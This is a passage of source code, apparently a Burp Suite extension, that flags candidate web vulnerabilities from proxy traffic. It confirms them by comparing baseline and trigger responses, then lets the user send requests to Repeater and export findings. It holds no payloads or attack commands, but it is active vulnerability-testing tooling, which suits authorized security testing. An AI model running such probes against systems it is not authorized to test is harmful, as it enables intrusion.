                if abs(diff) > 100:
                    evidence.append("Different data for ID %s (len diff %d)" % (payload, diff))
                    confidence = "High"
                elif trigger_body != baseline_body:
                    evidence.append("Different response for ID %s" % payload)
                    confidence = "Medium"

        if evidence:
            return {
                'evidence': "; ".join(evidence),
                'confidence': confidence,
                'trigger_status': trigger_status
            }
        return None

    def _add_confirmed(self, trigger_key, url, method, vuln_name, payload,
                       baseline_resp, trigger_resp, baseline_req, trigger_req,
                       service, evidence):
        ctab = self.confirmed_tabs.get(trigger_key)
        if ctab is None:
            return

        with self._lock:
            self.confirmed_counter += 1
            cid = self.confirmed_counter

            confirmed = {
                'id': cid,
                'url': url,
                'method': method,
                'vuln': vuln_name,
                'payload': payload,
                'baseline_status': self.helpers.analyzeResponse(baseline_resp).getStatusCode() if baseline_resp else 0,
                'trigger_status': evidence['trigger_status'],
                'baseline_len': len(baseline_resp) if baseline_resp else 0,
                'trigger_len': len(trigger_resp),
                'evidence': evidence['evidence'],
                'confidence': evidence['confidence'],
                'baseline_request': baseline_req,
                'baseline_response': baseline_resp,
                'trigger_request': trigger_req,
                'trigger_response': trigger_resp,
                'service': service
            }
            ctab.findings.append(confirmed)
            self.confirmed_findings.append(confirmed)

        def update():
            ctab.model.addRow([
                cid, url, method, vuln_name, payload[:80],
                confirmed['baseline_status'],
                evidence['trigger_status'],
                confirmed['baseline_len'],
                confirmed['trigger_len'],
                evidence['evidence'][:60],
                evidence['confidence']
            ])
            idx = self.tab_pane.indexOfComponent(ctab.scroll)
            if idx != -1:
                count = len(ctab.findings)
                self.tab_pane.setTitleAt(idx, "CONFIRMED-%s (%d)" % (vuln_name, count))
            self._update_status()

        SwingUtilities.invokeLater(SwingRun(update))

    # -------------------------------------------------------------------------
    # Confirmed tab UI interactions
    # -------------------------------------------------------------------------
    def _show_confirmed(self, confirmed):
        self.current_confirmed = confirmed
        self.current_finding = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(True)
        self._refresh_confirmed_editors()
        self.status.setText("CONFIRMED %s #%d | %s | %s" % (
            confirmed['vuln'], confirmed['id'], confirmed['confidence'], confirmed['evidence'][:80]))

    def _refresh_confirmed_editors(self):
        if not self.current_confirmed:
            return
        if self.viewing_baseline:
            req = self.current_confirmed['baseline_request']
            resp = self.current_confirmed['baseline_response']
        else:
            req = self.current_confirmed['trigger_request']
            resp = self.current_confirmed['trigger_response']

        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(req if req else empty, True)
        self.resp_editor.setMessage(resp if resp else empty, False)

    def _on_toggle(self, event=None):
        self.viewing_baseline = self.toggle_btn.isSelected()
        if self.current_confirmed:
            self._refresh_confirmed_editors()
            mode = "BASELINE" if self.viewing_baseline else "TRIGGER"
            self.status.setText("%s | %s #%d | %s" % (
                mode, self.current_confirmed['vuln'],
                self.current_confirmed['id'],
                self.current_confirmed['evidence'][:80]))
        elif self.current_finding:
            self._show_finding(self.current_finding)

    def _on_tab_changed(self):
        # When tab changes, clear current selection state and update UI
        idx = self.tab_pane.getSelectedIndex()
        if idx == -1:
            return

        comp = self.tab_pane.getComponentAt(idx)
        title = self.tab_pane.getTitleAt(idx)

        # Check if we're on a confirmed tab
        is_confirmed = False
        for ctab in self.confirmed_tabs.values():
            if ctab.scroll == comp:
                is_confirmed = True
                # Auto-select first row if nothing selected
                if ctab.model.getRowCount() > 0 and ctab.table.getSelectedRow() == -1:
                    ctab.table.setRowSelectionInterval(0, 0)
                break

        # Check if we're on a GF tab
        is_gf = False
        for tab in self.tabs_data.values():
            if tab.split_pane == comp:
                is_gf = True
                if tab.unique_model.getRowCount() > 0 and tab.unique_table.getSelectedRow() == -1:
                    tab.unique_table.setRowSelectionInterval(0, 0)
                break

        if not is_confirmed and not is_gf:
            # Unknown tab, clear editors
            self.current_confirmed = None
            self.current_finding = None
            self.viewing_baseline = False
            self.toggle_btn.setSelected(False)
            self.toggle_btn.setEnabled(False)
            empty = self.helpers.stringToBytes("")
            self.req_editor.setMessage(empty, True)
            self.resp_editor.setMessage(empty, False)

    def _send_confirmed_baseline(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            c = ctab.findings[model_row]
            self.callbacks.sendToRepeater(
                c['service'].getHost(), c['service'].getPort(),
                c['service'].getProtocol() == "https",
                c['baseline_request'], None
            )
            self.status.setText("Sent BASELINE to Repeater")

    def _send_confirmed_trigger(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            c = ctab.findings[model_row]
            self.callbacks.sendToRepeater(
                c['service'].getHost(), c['service'].getPort(),
                c['service'].getProtocol() == "https",
                c['trigger_request'], None
            )
            self.status.setText("Sent TRIGGER to Repeater")

    def _copy_confirmed_url(self, ctab):
        row = ctab.table.getSelectedRow()
        if row == -1:
            return
        model_row = ctab.table.convertRowIndexToModel(row)
        if 0 <= model_row < len(ctab.findings):
            url = ctab.findings[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied to clipboard")

    def _send_variant_to_repeater(self, tab):
        row = tab.variant_table.getSelectedRow()
        if row == -1:
            return
        model_row = tab.variant_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(tab.variant_instances):
            inst = tab.variant_instances[model_row]
            msg = inst['message']
            svc = msg.getHttpService()
            self.callbacks.sendToRepeater(
                svc.getHost(), svc.getPort(),
                svc.getProtocol() == "https",
                msg.getRequest(), None
            )
            self.status.setText("Sent to Repeater: %s" % inst['url'])

    def _copy_variant_url(self, tab):
        row = tab.variant_table.getSelectedRow()
        if row == -1:
            return
        model_row = tab.variant_table.convertRowIndexToModel(row)
        if 0 <= model_row < len(tab.variant_instances):
            url = tab.variant_instances[model_row]['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied to clipboard")

    def _apply_filter(self):
        idx = self.tab_pane.getSelectedIndex()
        if idx == -1:
            return

        comp = self.tab_pane.getComponentAt(idx)
        text = self.filter_field.getText().strip()

        # Check confirmed tabs first
        for ctab in self.confirmed_tabs.values():
            if ctab.scroll == comp:
                sorter = ctab.table.getRowSorter()
                if sorter is None:
                    return
                try:
                    if text:
                        sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text))
                    else:
                        sorter.setRowFilter(None)
                except Exception:
                    sorter.setRowFilter(None)
                return

        # GF tabs
        for tab in self.tabs_data.values():
            if tab.split_pane == comp:
                sorter = tab.unique_table.getRowSorter()
                if sorter is None:
                    return
                try:
                    if text:
                        sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text))
                    else:
                        sorter.setRowFilter(None)
                except Exception:
                    sorter.setRowFilter(None)
                return

    def _on_browse(self, event):
        chooser = JFileChooser()
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
        ret = chooser.showOpenDialog(self.main_panel)
        if ret == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            self.dir_field.setText(path)
            self._load_and_refresh(path)

    def _on_reload(self, event):
        self._load_and_refresh(self.dir_field.getText())

    def _on_scan(self, event):
        self.scan_btn.setEnabled(False)
        self.status.setText("Scanning proxy history ...")
        Thread(ScanRunner(self)).start()

    def _on_export(self, event):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("gf_trigger_findings.csv"))
        ret = chooser.showSaveDialog(self.main_panel)
        if ret == JFileChooser.APPROVE_OPTION:
            try:
                f = chooser.getSelectedFile()
                fos = FileOutputStream(f)
                w = OutputStreamWriter(fos, "UTF-8")
                w.write("ID,Category,URL,Method,Status,Length,MatchedParams,Match\n")
                for name, tab in sorted(self.tabs_data.items()):
                    for key, data in tab.uniques.items():
                        for inst in data['instances']:
                            w.write('%d,%s,%s,%s,%d,%d,%s,%s\n' % (
                                inst['id'],
                                self._csv_escape(name),
                                self._csv_escape(inst['url']),
                                self._csv_escape(inst['method']),
                                inst['status'],
                                inst['length'],
                                self._csv_escape(inst['param']),
                                self._csv_escape(inst['match'])
                            ))
                w.write("\n\nCONFIRMED FINDINGS\n")
                w.write("ID,URL,Method,Vuln,Payload,BaselineStatus,TriggerStatus,BaselineLen,TriggerLen,Evidence,Confidence\n")
                for c in self.confirmed_findings:
                    w.write('%d,%s,%s,%s,%s,%d,%d,%d,%d,%s,%s\n' % (
                        c['id'],
                        self._csv_escape(c['url']),
                        self._csv_escape(c['method']),
                        self._csv_escape(c['vuln']),
                        self._csv_escape(c['payload']),
                        c['baseline_status'],
                        c['trigger_status'],
                        c['baseline_len'],
                        c['trigger_len'],
                        self._csv_escape(c['evidence']),
                        self._csv_escape(c['confidence'])
                    ))
                w.close()
                JOptionPane.showMessageDialog(self.main_panel,
                    "Exported successfully to:\n%s" % f.getAbsolutePath())
            except Exception as e:
                JOptionPane.showMessageDialog(self.main_panel,
                    "Export failed: %s" % str(e),
                    "Error", JOptionPane.ERROR_MESSAGE)

    def _csv_escape(self, s):
        if '"' in s or ',' in s or '\n' in s or '\r' in s:
            return '"' + s.replace('"', '""') + '"'
        return s

    def _on_clear(self, event):
        with self._lock:
            for tab in self.tabs_data.values():
                tab.uniques.clear()
                tab.unique_entries = []
                tab.variant_instances = []
            self.confirmed_findings = []
            self.confirmed_counter = 0
            self.findings_counter = 0
            for ctab in self.confirmed_tabs.values():
                ctab.findings = []
        for tab in self.tabs_data.values():
            while tab.unique_model.getRowCount() > 0:
                tab.unique_model.removeRow(0)
            while tab.variant_model.getRowCount() > 0:
                tab.variant_model.removeRow(0)
            self._update_tab_title(tab.name)
        for ctab in self.confirmed_tabs.values():
            while ctab.model.getRowCount() > 0:
                ctab.model.removeRow(0)
            idx = self.tab_pane.indexOfComponent(ctab.scroll)
            if idx != -1:
                self.tab_pane.setTitleAt(idx, "CONFIRMED-%s" % ctab.name)
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self.toggle_btn.setSelected(False)
        self.toggle_btn.setEnabled(False)
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(empty, True)
        self.resp_editor.setMessage(empty, False)
        self._update_status()
        self.status.setText("Cleared")

    def _on_jump(self, event):
        if self._populating_combo:
            return
        name = self.jump_combo.getSelectedItem()
        if name and name in self.tabs_data:
            idx = self.tab_pane.indexOfComponent(self.tabs_data[name].split_pane)
            if idx != -1:
                self.tab_pane.setSelectedIndex(idx)

    def _update_status(self):
        gf_total = sum(len(u['instances']) for t in self.tabs_data.values() for u in t.uniques.values())
        confirmed_total = len(self.confirmed_findings)
        self.status.setText("Patterns: %d | GF: %d | Confirmed: %d" % (
            len(self.patterns), gf_total, confirmed_total))

    def createMenuItems(self, invocation):
        menus = ArrayList()
        item = JMenuItem("Send to GF + Trigger")
        item.addActionListener(ContextMenuListener(self, invocation))
        menus.add(item)
        return menus

    def getHttpService(self):
        if self.current_confirmed:
            return self.current_confirmed['service']
        if self.current_finding:
            return self.current_finding['message'].getHttpService()
        return None

    def getRequest(self):
        if self.current_confirmed:
            if self.viewing_baseline:
                return self.current_confirmed['baseline_request']
            return self.current_confirmed['trigger_request']
        if self.current_finding:
            return self.current_finding['message'].getRequest()
        return None

    def getResponse(self):
        if self.current_confirmed:
            if self.viewing_baseline:
                return self.current_confirmed['baseline_response']
            return self.current_confirmed['trigger_response']
        if self.current_finding:
            return self.current_finding['message'].getResponse()
        return None
